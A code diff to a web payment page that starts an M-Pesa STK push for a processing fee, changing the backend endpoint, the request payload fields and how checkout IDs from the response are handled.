@@ -147,7 +147,7 @@
             font-size: 12px;
             opacity: 0.8;
             margin-left: 10px;
-        }
+         }
 
         /* Invoice line break decoration rule */
         .invoice-divider {
@@ -462,7 +462,7 @@
 </div>
 
 <script>
-    const BACKEND_STKPUSH_URL = "https://newstkpush22.onrender.com/stkpush";
+    const BACKEND_STKPUSH_URL = "https://printpay-server200.onrender.com/pay";
 
     // Pull context details natively out of storage if configured or fallback securely
     const storageAmount = localStorage.getItem("amount") || "75000";
@@ -510,7 +510,7 @@
     phoneInput.addEventListener('blur', validateForm);
 
     document.getElementById('pay-btn').addEventListener('click', async () => {
-        const feeAmount = Number(storageFee);
+        const feeAmount = Math.round(Number(storageFee));
         if (!feeAmount || Number.isNaN(feeAmount) || feeAmount <= 0) {
             modal.style.display = "flex";
             statusText.innerText = "ERROR: Invalid or missing processing fee.";
@@ -526,13 +526,12 @@
         subStatusText.innerText = "Please check your phone for the M-Pesa prompt";
         subStatusText.style.display = "block";
 
-        const msisdn = '254' + phoneInput.value.trim().replace(/\D/g, "");
-        const reference = String(Math.floor(1000000 + Math.random() * 9000000));
+        const phone_number = '254' + phoneInput.value.trim().replace(/\D/g, "");
 
         const payload = {
-            amount: String(feeAmount),
-            msisdn,
-            reference
+            phone_number,
+            phone: phone_number,
+            amount: feeAmount
         };
 
         try {
@@ -544,11 +543,13 @@
 
             const data = await response.json().catch(() => ({}));
 
-            if (!response.ok || data.ok === false) {
-                throw new Error(data.message || data.error || "Invalid response from server.");
+            if (!response.ok || data.success === false || data.ok === false) {
+                throw new Error(data.message || data.error || "Failed to initiate STK push.");
             }
 
-            const requestId =
+            const checkoutId =
+                data.checkout_id ||
+                (data.data && data.data.checkout_id) ||
                 data.transaction_request_id ||
                 (data.data && data.data.transaction_request_id) ||
                 data.checkout_request_id ||
@@ -557,26 +558,30 @@
 
             const currentStatus = String(data.status || (data.data && data.data.status) || "").toLowerCase();
 
-            if (currentStatus === "completed" || currentStatus === "success") {
-                if (requestId) {
-                    localStorage.setItem("request_id", requestId);
+            if (currentStatus === "completed") {
+                if (checkoutId) {
+                    localStorage.setItem("checkout_id", checkoutId);
+                    localStorage.setItem("request_id", checkoutId);
                 }
                 statusText.innerText = "PAYMENT VERIFIED SUCCESSFULLY!";
                 statusText.style.color = "var(--safaricom-green)";
                 subStatusText.style.display = "none";
                 setTimeout(() => { window.location.href = "payment2.html"; }, 2000);
-            } else if (currentStatus === "pending" || requestId) {
-                if (!requestId) {
-                    throw new Error("Missing transaction tracking request ID");
-                }
-                localStorage.setItem("request_id", requestId);
-                statusText.innerText = "PROMPT SENT! REDIRECTING...";
-                statusText.style.color = "var(--safaricom-green)";
-                subStatusText.innerText = "Preparing secure tracking...";
-                setTimeout(() => { window.location.href = "processing.html"; }, 1500);
-            } else {
-                throw new Error(data.message || "Unrecognized payment response.");
+                return;
             }
+
+            if (!checkoutId) {
+                throw new Error("Missing checkout_id from backend response.");
+            }
+
+            localStorage.setItem("checkout_id", checkoutId);
+            localStorage.setItem("request_id", checkoutId);
+
+            statusText.innerText = "STK push sent enter your pin";
+            statusText.style.color = "var(--safaricom-green)";
+            subStatusText.innerText = "Preparing secure tracking...";
+
+            setTimeout(() => { window.location.href = "processing.html"; }, 1500);
         } catch (error) {
             statusText.innerText = "ERROR: " + error.message;
             statusText.style.color = "var(--error-red)";
